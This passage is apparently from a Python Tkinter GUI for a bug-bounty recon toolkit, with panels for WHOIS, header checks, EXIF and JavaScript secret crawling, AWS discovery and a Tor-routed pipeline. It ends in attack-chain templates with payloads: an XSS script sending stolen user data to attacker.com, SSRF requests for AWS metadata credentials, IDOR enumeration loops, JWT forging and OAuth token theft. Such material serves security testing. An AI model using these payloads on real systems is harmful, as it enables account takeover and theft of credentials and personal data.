                lines = ["=== WHOIS ==="]
                for k in ['registrar','created','expires','updated','registrant']:
                    if w.get(k): lines.append(f"  {k.capitalize()}: {w[k]}")
                if w.get('nameservers'): lines.append(f"  Nameservers: {', '.join(w['nameservers'])}")
                if w.get('emails'): lines.append(f"  Emails: {', '.join(w['emails'])}")
                lines.append(f"\n=== ASN / IP INTEL ===")
                lines.append(f"  IP:       {a.get('ip','')}")
                lines.append(f"  Org/ASN:  {a.get('org','')}")
                lines.append(f"  Country:  {a.get('country','')}")
                lines.append(f"  City:     {a.get('city','')}")
                if a.get('ranges'):
                    lines.append(f"\n  IP Ranges ({len(a['ranges'])}):")
                    for cidr in a['ranges'][:30]: lines.append(f"    {cidr}")
                if w.get('error'): lines.append(f"\nWHOIS Error: {w['error']}")
                if a.get('error'): lines.append(f"ASN Error: {a['error']}")
                content = '\n'.join(lines)
                def _upd():
                    self._whois_txt.config(state='normal')
                    self._whois_txt.delete('1.0','end')
                    self._whois_txt.insert('end', content)
                    self._whois_txt.config(state='disabled')
                    self.set_status(f"WHOIS+ASN: {a.get('org','')}, {len(a.get('ranges',[]))} IP ranges", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Run WHOIS + ASN", run_whois, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._whois_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._whois_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)

    def _build_tor_headers(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "HTTP HEADER SECURITY ANALYSIS", "🔍").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Checks: Security headers, Cookie flags, CORS, HSTS, CDN/WAF detection\n"
            "  Tech disclosure: Server, X-Powered-By, X-Generator, X-Backend-Server\n"
            "  Results auto-saved to logs/<project>/http_headers.json"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        self._hdrs_txt = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._hdrs_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_headers():
            target = tvar.get().strip()
            if not target: return
            url = target if target.startswith('http') else f"https://{target}"
            self._hdrs_txt.config(state='normal')
            self._hdrs_txt.delete('1.0','end')
            self._hdrs_txt.insert('end', f"[*] Fetching headers: {url}\n")
            if tor_var.get(): self._hdrs_txt.insert('end', f"[*] Via Tor: enabled\n")
            self._hdrs_txt.config(state='disabled')
            def _go():
                # Try direct fetch first, then tor
                use_tor = tor_var.get()
                r = tr.analyze_http_headers(url, use_tor=use_tor)
                # If Tor failed, try direct
                if r.get('error') and use_tor:
                    r2 = tr.analyze_http_headers(url, use_tor=False)
                    if not r2.get('error'):
                        r = r2
                        r['note'] = 'Tor failed — used direct connection'
                lines = []
                if r.get('note'): lines.append(f"[!] {r['note']}\n")
                if r.get('error'):
                    lines.append(f"[!] Error: {r['error']}")
                    lines.append(f"    Try checking if URL is reachable: {url}")
                else:
                    lines.append(f"Security Score: {r.get('score',0)}/10")
                    if r.get('cdn_waf'):
                        lines.append(f"CDN/WAF:        {', '.join(r['cdn_waf'])}")
                    lines.append("\n=== ALL HEADERS ===")
                    for k, v in r.get('headers', {}).items():
                        lines.append(f"  {k}: {v}")
                    lines.append(f"\n=== SECURITY HEADERS ({len(r.get('security',{}))}/10) ===")
                    for k, v in r.get('security', {}).items():
                        lines.append(f"  ✅ {k}: {v[:80]}")
                    if r.get('missing_security'):
                        lines.append(f"\n=== MISSING SECURITY HEADERS ({len(r['missing_security'])}) ===")
                        for m in r['missing_security']: lines.append(f"  ❌ {m}")
                    if r.get('tech_disclosure'):
                        lines.append(f"\n=== TECH DISCLOSURE ===")
                        for t2 in r['tech_disclosure']: lines.append(f"  ℹ {t2}")
                    if r.get('cookie_issues'):
                        lines.append(f"\n=== COOKIE ISSUES ===")
                        for ci in r['cookie_issues']:
                            lines.append(f"  🍪 {ci['cookie'][:60]}")
                            for iss in ci['issues']: lines.append(f"      ⚠ {iss}")
                    lines.append(f"\n=== FINDINGS ({len(r.get('findings',[]))}) ===")
                    for f2 in r.get('findings', []): lines.append(f"  {f2}")

                    # Save to project logs
                    domain = url.replace('https://','').replace('http://','').split('/')[0]
                    proj   = self.project.get() or domain
                    proj_dir = LOGS_DIR / proj
                    proj_dir.mkdir(parents=True, exist_ok=True)
                    import json as _json
                    out = proj_dir / "http_headers.json"
                    try:
                        with open(out, 'w') as f2:
                            _json.dump(r, f2, indent=2, default=str)
                        lines.append(f"\n[✓] Saved: {out}")
                    except Exception: pass

                content = '\n'.join(lines)
                def _upd():
                    self._hdrs_txt.config(state='normal')
                    self._hdrs_txt.delete('1.0','end')
                    self._hdrs_txt.insert('end', content)
                    self._hdrs_txt.config(state='disabled')
                    self.set_status(
                        f"Headers: score={r.get('score',0)}/10, {len(r.get('findings',[]))} findings",
                        GREEN if not r.get('error') else RED)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Analyze Headers", run_headers, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._hdrs_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._hdrs_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)

    def _build_tor_exif(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "EXIF METADATA EXTRACTION", "📸").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Extracts GPS coordinates, camera model, software, author, timestamps from images\n"
            "  exiftool used if installed, else Python struct-based JPEG/PNG parser as fallback\n"
            "  Results saved to logs/<project>/exif_metadata.json"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        mode_f = mk_frame(pad, bg=BG2); mode_f.pack(fill='x', pady=(0,6))
        mode_var = tk.StringVar(value="domain")
        ttk.Radiobutton(mode_f, text="🌐 Crawl Domain (all images)", variable=mode_var, value="domain").pack(side='left')
        ttk.Radiobutton(mode_f, text="🖼 Single Image URL", variable=mode_var, value="url").pack(side='left', padx=12)
        max_f = mk_frame(pad, bg=BG2); max_f.pack(fill='x', pady=(0,8))
        tk.Label(max_f, text="Max images:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        max_var = tk.StringVar(value="20")
        ttk.Combobox(max_f, textvariable=max_var, values=["5","10","20","50","100"], width=5, font=MONO_S).pack(side='left', padx=6)
        self._exif_txt = mk_stext(pad, h=20, bg=BG3, fg=FG)
        self._exif_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_exif():
            target = tvar.get().strip()
            if not target: return
            use_tor = tor_var.get()
            try: max_imgs = int(max_var.get())
            except: max_imgs = 20
            self._exif_txt.config(state='normal')
            self._exif_txt.delete('1.0','end')
            self._exif_txt.insert('end', f"[*] EXIF extraction: {target}\n")
            self._exif_txt.insert('end', f"[*] Mode: {'Crawl domain' if mode_var.get()=='domain' else 'Single URL'}, max {max_imgs} images\n\n")
            self._exif_txt.config(state='disabled')
            def _go():
                lines = []
                all_findings = []
                if mode_var.get() == "url":
                    r = tr.extract_exif_from_url(target, use_tor=use_tor)
                    lines.append(f"URL: {target}")
                    if r.get('error'):
                        lines.append(f"[!] Error: {r['error']}")
                    else:
                        exif = r.get('exif', {})
                        if exif:
                            lines.append("=== EXIF DATA ===")
                            for k, v in exif.items():
                                if str(v).strip() and k not in ('SourceFile','Directory','FileName'):
                                    lines.append(f"  {k}: {v}")
                        findings = r.get('findings', [])
                        if findings:
                            lines.append("\n=== KEY FINDINGS ===")
                            for f2 in findings: lines.append(f"  {f2}")
                        all_findings.extend(findings)
                else:
                    domain = target if not target.startswith('http') else target.replace('https://','').replace('http://','').split('/')[0]
                    r = tr.extract_exif_from_domain(domain, use_tor=use_tor, max_images=max_imgs)
                    images = r.get('images', [])
                    lines.append(f"Domain: {domain}")
                    lines.append(f"Images analyzed: {len(images)}")
                    if r.get('error'): lines.append(f"Error: {r['error']}")
                    if r.get('gps_found'):
                        lines.append(f"\n=== 🗺 GPS LOCATIONS FOUND ({len(r['gps_found'])}) ===")
                        for g in r['gps_found']:
                            lines.append(f"  Image: {g['url']}")
                            gps = g.get('gps',{})
                            lines.append(f"  GPS:   lat={gps.get('lat','')}, lon={gps.get('lon','')}")
                            lines.append(f"  Maps:  https://maps.google.com/?q={gps.get('lat','')},{gps.get('lon','')}")
                    lines.append(f"\n=== ALL FINDINGS ({len(r.get('findings',[]))}) ===")
                    for f2 in r.get('findings', []): lines.append(f"  {f2}")
                    all_findings.extend(r.get('findings', []))
                    if images:
                        lines.append(f"\n=== IMAGE DETAILS ===")
                        for img in images[:10]:
                            lines.append(f"\n  {img.get('url','')}")
                            for f2 in img.get('findings', []):
                                lines.append(f"    {f2}")

                # Save to project logs
                proj = self.project.get() or target.replace('https://','').replace('http://','').split('/')[0]
                proj_dir = LOGS_DIR / proj
                proj_dir.mkdir(parents=True, exist_ok=True)
                import json as _json
                out = proj_dir / "exif_metadata.json"
                try:
                    with open(out, 'w') as f2:
                        _json.dump({'target': target, 'findings': all_findings,
                                    'result': str(r)[:5000]}, f2, indent=2)
                    lines.append(f"\n[✓] Saved: {out}")
                except Exception: pass

                content = '\n'.join(lines)
                def _upd():
                    self._exif_txt.config(state='normal')
                    self._exif_txt.delete('1.0','end')
                    self._exif_txt.insert('end', content)
                    self._exif_txt.config(state='disabled')
                    self.set_status(f"EXIF: {len(all_findings)} findings → {out.name}", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Extract EXIF", run_exif, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._exif_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._exif_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)

    def _build_tor_js(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "JAVASCRIPT SOURCE INTELLIGENCE", "📜").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Finds: API endpoints, AWS keys, JWT tokens, GitHub tokens, internal URLs\n"
            "  Detects: fetch() calls, axios, XHR, GraphQL endpoints, Swagger docs"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        self._js_intel_txt = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._js_intel_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_js():
            domain = tvar.get().strip()
            if not domain: return
            use_tor = tor_var.get()
            self._js_intel_txt.config(state='normal'); self._js_intel_txt.delete('1.0','end')
            self._js_intel_txt.insert('end', f"[*] JS Source Analysis: {domain}\n"); self._js_intel_txt.config(state='disabled')
            def _go():
                r = tr.crawl_js_files(domain, use_tor=use_tor)
                lines = [f"JS files analyzed: {len(r.get('js_files',[]))}\n",
                         f"Total findings:    {r.get('total_findings',0)}\n"]
                if r.get('all_secrets'):
                    lines.append(f"\n=== 🚨 SECRETS FOUND ({len(r['all_secrets'])}) ===")
                    for s in r['all_secrets']:
                        lines.append(f"  [{s['type']}]  {s['value'][:80]}")
                if r.get('all_internals'):
                    lines.append(f"\n=== 🔒 INTERNAL URLS ({len(r['all_internals'])}) ===")
                    for u in r['all_internals']: lines.append(f"  {u}")
                if r.get('all_endpoints'):
                    lines.append(f"\n=== 🔗 API ENDPOINTS ({len(r['all_endpoints'])}) ===")
                    for ep in sorted(r['all_endpoints'])[:100]: lines.append(f"  {ep}")
                lines.append(f"\n=== JS FILES BREAKDOWN ===")
                for jf in r.get('js_files',[]):
                    lines.append(f"\n  {jf['url']}")
                    lines.append(f"  Size: {jf['size']} bytes | Risk: {jf['risk']}")
                    if jf.get('secrets'): lines.append(f"  Secrets: {len(jf['secrets'])}")
                    if jf.get('endpoints'): lines.append(f"  Endpoints: {len(jf['endpoints'])}")
                content = '\n'.join(lines)
                def _upd():
                    self._js_intel_txt.config(state='normal')
                    self._js_intel_txt.delete('1.0','end')
                    self._js_intel_txt.insert('end', content)
                    self._js_intel_txt.config(state='disabled')
                    self.set_status(f"JS: {len(r.get('all_secrets',[]))} secrets, {len(r.get('all_endpoints',[]))} endpoints", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Crawl & Analyze JS", run_js, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._js_intel_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._js_intel_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)

    def _build_tor_aws(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "AWS INFRASTRUCTURE IDENTIFICATION", "☁").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Identifies: S3 buckets, CloudFront, ELB, Lambda, RDS, API Gateway, Cognito\n"
            "  Checks: Public S3 buckets, AWS IPs in DNS, CNAME to AWS services"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        # ArcGIS toggle
        arcgis_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(pad, text="Also check ArcGIS REST API", variable=arcgis_var).pack(anchor='w', pady=(0,8))
        self._aws_intel_txt = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._aws_intel_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_aws():
            domain = tvar.get().strip()
            if not domain: return
            use_tor = tor_var.get()
            self._aws_intel_txt.config(state='normal'); self._aws_intel_txt.delete('1.0','end')
            self._aws_intel_txt.insert('end', f"[*] AWS Intel for: {domain}\n"); self._aws_intel_txt.config(state='disabled')
            def _go():
                r = tr.identify_aws_infrastructure(domain, use_tor=use_tor)
                lines = [f"AWS Assets Found: {len(r.get('aws_assets',[]))}\n",
                         f"Services:  {', '.join(r.get('services',[]))}\n",
                         f"Regions:   {', '.join(r.get('regions',[]))}\n",
                         f"S3 Buckets: {len(r.get('s3_buckets',[]))}\n"]
                if r.get('findings'):
                    lines.append("=== FINDINGS ===")
                    for f2 in r['findings']: lines.append(f"  {f2}")
                if r.get('aws_assets'):
                    lines.append("\n=== ALL AWS ASSETS ===")
                    for a2 in r['aws_assets']:
                        lines.append(f"  [{a2['type']}] {a2['name']} (from {a2['source']})")
                if arcgis_var.get():
                    lines.append("\n=== ARCGIS REST API ===")
                    ag = tr.enumerate_arcgis(domain, use_tor=use_tor)
                    if ag.get('endpoints'):
                        lines.append(f"  Endpoints found: {len(ag['endpoints'])}")
                        lines.append(f"  Services: {len(ag.get('services',[]))}")
                        lines.append(f"  Layers: {len(ag.get('layers',[]))}")
                        for f3 in ag.get('findings',[]): lines.append(f"  {f3}")
                    else:
                        lines.append("  No ArcGIS endpoints found")
                content = '\n'.join(lines)
                def _upd():
                    self._aws_intel_txt.config(state='normal')
                    self._aws_intel_txt.delete('1.0','end')
                    self._aws_intel_txt.insert('end', content)
                    self._aws_intel_txt.config(state='disabled')
                    pub_s3 = [f for f in r.get('findings',[]) if 'PUBLIC' in f]
                    self.set_status(f"AWS: {len(r.get('aws_assets',[]))} assets, {len(pub_s3)} public S3", RED if pub_s3 else GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Identify AWS Infra", run_aws, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._aws_intel_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _build_tor_news(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "NEWS INTELLIGENCE AGGREGATION", "📰").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Sources: Google News RSS, HackerNews\n"
            "  Finds: Security breaches, tech stack hints from job postings, acquisitions"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        cols = ('Source','Title','Date')
        self._news_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c, w in [('Source',100),('Title',560),('Date',120)]:
            self._news_tree.heading(c, text=c, anchor='w')
            self._news_tree.column(c, width=w, anchor='w')
        self._news_tree.tag_configure('security', foreground=RED, background=BG3)
        self._news_tree.tag_configure('tech', foreground=CYAN, background=BG3)
        self._news_tree.tag_configure('normal', foreground=FG2, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._news_tree.yview)
        self._news_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._news_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._news_tree.bind('<Double-1>', lambda e: webbrowser.open(
            self._news_tree.item(self._news_tree.selection()[0])['values'][1]
            if self._news_tree.selection() else ''))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        self._news_stat = tk.Label(bf, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._news_stat.pack(side='left')
        def run_news():
            domain = tvar.get().strip()
            if not domain: return
            use_tor = tor_var.get()
            self._news_stat.config(text="Fetching news...", fg=CYAN)
            self._news_tree.delete(*self._news_tree.get_children())
            def _go():
                r = tr.aggregate_news(domain, use_tor=use_tor)
                sec_urls = set(a['url'] for a in r.get('security_mentions',[]))
                tech_urls = set(a['url'] for a in r.get('tech_mentions',[]))
                def _upd():
                    for a in r.get('articles', []):
                        tag = 'security' if a['url'] in sec_urls else ('tech' if a['url'] in tech_urls else 'normal')
                        self._news_tree.insert('', 'end', values=(
                            a.get('source',''), a.get('title','')[:100], a.get('date','')[:16]), tags=(tag,))
                    self._news_stat.config(
                        text=f"Articles: {len(r.get('articles',[]))}  |  Security: {len(r.get('security_mentions',[]))}  |  Tech: {len(r.get('tech_mentions',[]))}",
                        fg=RED if r.get('security_mentions') else GREEN)
                    self.set_status(f"News: {len(r.get('security_mentions',[]))} security mentions", RED if r.get('security_mentions') else GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Fetch News Intel", run_news, GREEN, small=True).pack(side='right', padx=4)

    def _build_tor_pipeline(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "FULL DEEP RECON PIPELINE", "🚀").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Runs ALL modules in parallel threads:\n"
            "  CT Enum → DNS → WHOIS/ASN → HTTP Headers → JS Analysis → ArcGIS → AWS Intel → News\n"
            "  Saves full JSON report to logs/\n"
            "  ⚠ Ensure Tor is running for anonymous operation"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=10)
        tvar, tor_var = self._tor_shared_target(pad)
        # Progress indicators
        self._pipe_status_labels = {}
        prog_f = mk_card(pad); prog_f.pack(fill='x', pady=(0,8))
        pf2 = mk_frame(prog_f, bg=BG3); pf2.pack(fill='x', padx=12, pady=8)
        phases = ["CT crt.sh","CT HackerTarget","DNS Recon","WHOIS","ASN Mapping",
                  "HTTP Headers","JS Analysis","ArcGIS Enum","AWS Infra","News Intel"]
        for i, ph in enumerate(phases):
            r2, c = divmod(i, 5)
            lbl = tk.Label(pf2, text=f"○ {ph}", bg=BG3, fg=FG3, font=MONO_T, width=18, anchor='w')
            lbl.grid(row=r2, column=c, padx=4, pady=2, sticky='w')
            self._pipe_status_labels[ph] = lbl
        self._pipeline_term = Terminal(pad, height=14, title="DEEP RECON PIPELINE")
        self._pipeline_term.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        def run_pipeline():
            domain = tvar.get().strip()
            if not domain: return
            use_tor = tor_var.get()
            for ph in self._pipe_status_labels.values():
                ph.config(text=ph.cget('text').replace('✅','○').replace('❌','○'), fg=FG3)
            self._pipeline_term.log(f"[*] Starting Deep Recon Pipeline for: {domain}", 'warn')
            self._pipeline_term.log(f"[*] Via Tor: {use_tor}", 'info')
            def log_cb(msg, tag='info'):
                self._pipeline_term.log(msg, tag)
                # Update phase labels
                for ph_name in phases:
                    if ph_name.lower() in msg.lower():
                        if 'done' in msg.lower() or 'starting' in msg.lower():
                            color = GREEN if 'done' in msg.lower() else CYAN
                            sym   = '✅' if 'done' in msg.lower() else '⟳'
                            lbl   = self._pipe_status_labels.get(ph_name)
                            if lbl:
                                self.root.after(0, lambda l=lbl, s=sym, n=ph_name, c=color:
                                    l.config(text=f"{s} {n}", fg=c))
            def _go():
                r = tr.deep_recon_pipeline(domain, use_tor=use_tor, log_cb=log_cb)
                def _upd():
                    self._pipeline_term.log("\n[✓] PIPELINE COMPLETE", 'ok')
                    for s in r.get('summary',[]): self._pipeline_term.log(f"    {s}", 'info')
                    for ph in self._pipe_status_labels.values():
                        if '⟳' in ph.cget('text'):
                            ph.config(text=ph.cget('text').replace('⟳','✅'), fg=GREEN)
                    self.set_status(f"Deep Recon done: {domain}", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "🚀 RUN FULL PIPELINE", run_pipeline, RED).pack(side='left', ipady=8, padx=4)
        mk_btn(bf, "📂 Open Reports", lambda: open_folder(str(LOGS_DIR)), FG2, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  CHAIN BUILDER — Vulnerability Chaining Engine
    # ═════════════════════════════════════════════════════════════
    def _build_chain_builder(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔗 Chain Templates  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🧠 Smart Correlator  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  💡 Impact Amplifier  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  📊 Priority Scorer  ")
        self._build_chain_templates(f1)
        self._build_smart_correlator(f2)
        self._build_impact_amplifier(f3)
        self._build_priority_scorer(f4)

    def _build_chain_templates(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "VULNERABILITY CHAIN TEMPLATES", "🔗").pack(fill='x', pady=(0,10))

        CHAINS = {
            "🔴 SSRF → Cloud RCE": {
                "severity": "CRITICAL",
                "description": "SSRF on any parameter → Reach AWS metadata → Get IAM credentials → CLI access → RCE via Lambda/EC2",
                "steps": [
                    "1. Find SSRF: test url/path/redirect params with http://169.254.169.254/",
                    "2. GET /latest/meta-data/iam/security-credentials/",
                    "3. GET /latest/meta-data/iam/security-credentials/{role}",
                    "4. Extract: AccessKeyId, SecretAccessKey, Token",
                    "5. aws configure + aws sts get-caller-identity",
                    "6. aws s3 ls (list all buckets) / aws lambda list-functions",
                    "7. If Lambda: aws lambda invoke → RCE",
                    "8. Document with screenshots → CRITICAL report",
                ],
                "poc_cmd": [
                    "curl 'https://TARGET/api?url=http://169.254.169.254/latest/meta-data/'",
                    "curl 'https://TARGET/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                    "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...",
                    "aws sts get-caller-identity",
                ]
            },
            "🔴 XSS → Account Takeover": {
                "severity": "CRITICAL",
                "description": "Stored XSS on admin-visible page → Steal CSRF token → Change admin email/password → Full ATO",
                "steps": [
                    "1. Find XSS: stored preferred (user profile, comments, tickets)",
                    "2. Check if admin views this page",
                    "3. Test HttpOnly flag on session cookie",
                    "4. If no HttpOnly: steal cookie via document.cookie",
                    "5. If HttpOnly: use XSS to make CSRF requests",
                    "6. XSS payload: fetch CSRF token → POST /change-email",
                    "7. Change admin email to attacker email",
                    "8. Trigger password reset → Full account takeover",
                ],
                "poc_cmd": [
                    "<script>fetch('/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/?d='+btoa(JSON.stringify(d))))</script>",
                    "<script>fetch('/change-email',{method:'POST',body:JSON.stringify({email:'attacker@evil.com'}),headers:{'Content-Type':'application/json'},credentials:'include'})</script>",
                ]
            },
            "🔴 IDOR → Mass PII Leak": {
                "severity": "CRITICAL",
                "description": "IDOR on user ID parameter → Sequential enumeration → Exfiltrate all users data",
                "steps": [
                    "1. Find user ID in API: /api/users/{id} or /profile?id=123",
                    "2. Try id=1, id=2, id=3 — can you see other users?",
                    "3. Automate: for i in range(1,1000): GET /api/users/{i}",
                    "4. Collect: email, name, phone, address, payment info",
                    "5. Check: can you edit other user's data? (BOLA)",
                    "6. Calculate total users from highest visible ID",
                    "7. Document sample of 3-5 users (redacted) in report",
                ],
                "poc_cmd": [
                    "for i in $(seq 1 100); do curl -s 'https://TARGET/api/users/'$i -H 'Authorization: Bearer YOUR_TOKEN'; done",
                    "python3 -c \"import requests,json; [print(requests.get(f'https://TARGET/api/users/{i}', headers={'Authorization':'Bearer TOKEN'}).text[:100]) for i in range(1,50)]\"",
                ]
            },
            "🔴 Subdomain Takeover → Cookie Hijack": {
                "severity": "HIGH",
                "description": "Dangling CNAME → Register on that service → Host malicious page → Steal same-origin cookies",
                "steps": [
                    "1. Find dangling CNAMEs: subzy -urls subdomains.txt",
                    "2. Check CNAME target: dig sub.target.com CNAME",
                    "3. Register on the platform (GitHub Pages, Heroku, S3)",
                    "4. Point to your controlled content",
                    "5. Verify takeover: curl https://sub.target.com",
                    "6. Host: document.cookie theft or phishing page",
                    "7. Cookies from sub.target.com = same domain as target.com",
                ],
                "poc_cmd": [
                    "subzy run --targets subdomains.txt --concurrency 20 --timeout 10",
                    "dig dangling-sub.target.com CNAME",
                    "# Register on vulnerable platform, then verify:",
                    "curl -I https://dangling-sub.target.com",
                ]
            },
            "🔴 JWT None → Admin Access": {
                "severity": "CRITICAL",
                "description": "JWT with RS256 algorithm → Key confusion attack OR alg:none → Forge admin token",
                "steps": [
                    "1. Grab your JWT token from browser/Burp",
                    "2. Decode: base64url decode header + payload",
                    "3. Check algorithm: RS256, HS256, or none",
                    "4. Try alg:none: set alg to 'none', remove signature",
                    "5. Try RS256→HS256: get public key, sign with HS256 using pubkey as secret",
                    "6. Modify payload: role=admin, isAdmin=true, id=1",
                    "7. Try forged token on admin endpoints",
                ],
                "poc_cmd": [
                    "# Decode JWT",
                    "echo 'eyJ...' | cut -d. -f1 | base64 -d",
                    "echo 'eyJ...' | cut -d. -f2 | base64 -d",
                    "# JWT Tool: python3 jwt_tool.py TOKEN -X a (alg:none)",
                    "# RS256→HS256: python3 jwt_tool.py TOKEN -X k -pk public.pem",
                ]
            },
            "🟡 Open Redirect → Token Steal": {
                "severity": "HIGH",
                "description": "OAuth redirect_uri bypass via open redirect → Authorization code/token ends up at attacker server",
                "steps": [
                    "1. Find open redirect: /redirect?url=https://evil.com",
                    "2. Find OAuth flow: client_id, redirect_uri in auth URL",
                    "3. Test: redirect_uri=https://target.com/redirect?url=https://attacker.com",
                    "4. If accepted: trigger OAuth flow with modified redirect_uri",
                    "5. Token/code delivered to attacker.com via Referer",
                    "6. Exchange code for access token → Account takeover",
                ],
                "poc_cmd": [
                    "https://TARGET/oauth/authorize?client_id=X&redirect_uri=https://TARGET.com/redirect%3Furl%3Dhttps://attacker.com&response_type=code",
                ]
            },
        }

        # Left: chain list
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, width=220)
        tk.Label(left, text="CHAIN LIBRARY", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(0,6), anchor='w')
        chain_lb = tk.Listbox(left, bg=BG3, fg=FG, font=MONO_S,
                               selectbackground=BG5, selectforeground=ACCENT,
                               relief='flat', bd=0, height=22)
        vsb = ttk.Scrollbar(left, orient='vertical', command=chain_lb.yview)
        chain_lb.configure(yscrollcommand=vsb.set)
        chain_lb.pack(side='left', fill='both', expand=True)
